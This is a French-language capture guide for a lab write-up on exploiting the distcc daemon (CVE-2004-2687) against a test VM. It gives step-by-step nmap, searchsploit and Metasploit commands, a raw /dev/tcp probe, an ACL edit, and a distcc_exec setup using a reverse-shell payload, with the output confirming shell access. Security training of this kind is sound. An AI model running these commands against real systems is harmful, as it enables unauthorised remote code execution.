# Captures — DistCC Daemon RCE

Consignes de capture pour `services/distcc.html`. Commandes identiques à celles du write-up
source : `ms1/jules/distcc.md`.

## 01-recon-nmap.png

Commandes (les deux à la suite, même terminal) :
```bash
nmap -sC -sV -p 3632 172.28.128.4
nmap -p 3632 --script distcc-cve2004-2687 172.28.128.4
```

Encadrer en rouge : la ligne `State: VULNERABLE (Exploitable)` et la ligne `uid=1(daemon)...`
dans la sortie du script NSE — preuve directe, obtenue parce que l'ACL est déjà corrigée
(persistante depuis une session précédente).

## 02-recherche-module.png

Les deux commandes à la suite :
```bash
searchsploit distcc
msfconsole -q -x "search distcc; exit"
```

Encadrer en rouge : la ligne `exploit/unix/misc/distcc_exec` dans le résultat de `search`.

## 03-info-cve.png

Commande :
```bash
msfconsole -q -x "info exploit/unix/misc/distcc_exec; exit"
```

Capturer la section `References`. Encadrer en rouge :
`https://nvd.nist.gov/vuln/detail/CVE-2004-2687`.

## 04-sonder-protocole.png

Commande :
```bash
timeout 10 bash -c 'exec 3<>/dev/tcp/172.28.128.4/3632 && echo CONNECTED && printf "DIST00000001" >&3 && timeout 2 cat <&3 | xxd | head -5'
```

Résultat attendu aujourd'hui (ACL déjà corrigée) : `CONNECTED` puis rien d'autre (timeout
propre, pas de RST). Encadrer en rouge : aucun — juste `CONNECTED` suffit à montrer que la
connexion tient, le point important est l'**absence** de message d'erreur après.

## 05-corriger-acl.png

Sur la console VM (`msfadmin`/`msfadmin`), les 3 commandes à la suite :
```bash
sudo sed -i 's#--allow 172.16.0.0/16#--allow 172.16.0.0/16 --allow 172.28.128.0/24#' /etc/init.d/distcc
sudo pkill -9 distccd
sudo /etc/init.d/distcc start
```
puis vérification :
```bash
ps aux | grep distccd
```

Encadrer en rouge : la ligne du process `distccd` montrant `--allow 172.28.128.0/24` à la
fin de ses arguments — preuve que l'ACL inclut bien notre réseau.

⚠️ Vécu en reprenant cette capture : le mot de passe `sudo` peut demander d'être retapé
(`Sorry, try again`) si une commande précédente a expiré le cache d'authentification — pas
un bug, juste reprendre la saisie.

## 06-exploit-config.png

Dans `msfconsole`, ligne par ligne :
```
msf6 > use exploit/unix/misc/distcc_exec
msf6 exploit(unix/misc/distcc_exec) > set RHOSTS 172.28.128.4
RHOSTS => 172.28.128.4
msf6 exploit(unix/misc/distcc_exec) > set PAYLOAD cmd/unix/reverse
PAYLOAD => cmd/unix/reverse
msf6 exploit(unix/misc/distcc_exec) > set LHOST 172.28.128.1
LHOST => 172.28.128.1
msf6 exploit(unix/misc/distcc_exec) > set LPORT 4445
LPORT => 4445
```

S'arrêter avant `exploit -z` (capture suivante). Encadrer en rouge : aucun — les 4 lignes de
config sont déjà courtes et toutes pertinentes.

## 07-exploit-launch.png

Suite directe :
```
msf6 exploit(unix/misc/distcc_exec) > exploit -z
[*] Started reverse TCP double handler on 172.28.128.1:4445
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command shell session 1 opened (172.28.128.1:4445 -> 172.28.128.4:xxxxx)
[*] Session 1 created in the background.
```

Encadrer en rouge : la ligne `[*] Command shell session 1 opened (...)`.

## 08-preuve-acces.png

Suite directe :
```
msf6 exploit(unix/misc/distcc_exec) > sessions -i 1 -c id
[*] Running 'id' on shell session 1 (172.28.128.4)
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

Encadrer en rouge : `uid=1(daemon) gid=1(daemon)` — la preuve finale d'accès.
